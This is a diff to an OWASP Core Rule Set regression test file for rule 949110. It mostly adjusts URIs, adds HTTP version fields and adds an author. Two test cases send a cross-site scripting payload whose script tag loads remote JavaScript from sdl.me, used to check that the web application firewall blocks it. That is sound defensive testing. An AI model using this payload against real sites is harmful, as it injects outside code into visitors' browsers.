@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "studersi"
+  author: "studersi, azurit"
   enabled: true
   name: "949110.yaml"
   description: |
@@ -17,11 +17,12 @@ tests:
             dest_addr: 127.0.0.1
             method: GET
             port: 80
-            uri: '/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
+            uri: '/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
             headers:
               User-Agent: "OWASP CRS test agent"
               Host: localhost
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            version: "HTTP/1.1"
           output:
             log_contains: id "949110"
   - test_title: 949110-2
@@ -32,12 +33,13 @@ tests:
             dest_addr: 127.0.0.1
             method: GET
             port: 80
-            uri: /
+            uri: "/get"
             headers:
               User-Agent: "OWASP CRS test agent"
               Referer: http://www.coreruleset.org
               Host: localhost
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            version: "HTTP/1.1"
           output:
             no_log_contains: id "949110"
   - test_title: 949110-3
@@ -52,8 +54,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            protocol: "http"
-            uri: "/"
+            uri: "/options"
             version: "HTTP/1.1"
           output:
             no_log_contains: "id \"949110\""
@@ -69,7 +70,6 @@ tests:
               User-Agent: "OWASP CRS test agent"
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-            protocol: "http"
             uri: "/"
             version: "HTTP/1.1"
           output:
@@ -82,10 +82,11 @@ tests:
             dest_addr: 127.0.0.1
             method: GET
             port: 80
-            uri: '/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
+            uri: '/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//'
             headers:
               User-Agent: "OWASP CRS test agent"
               Host: localhost
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            version: "HTTP/1.1"
           output:
             log_contains: "Inbound Anomaly Score Exceeded [(]Total Score: "
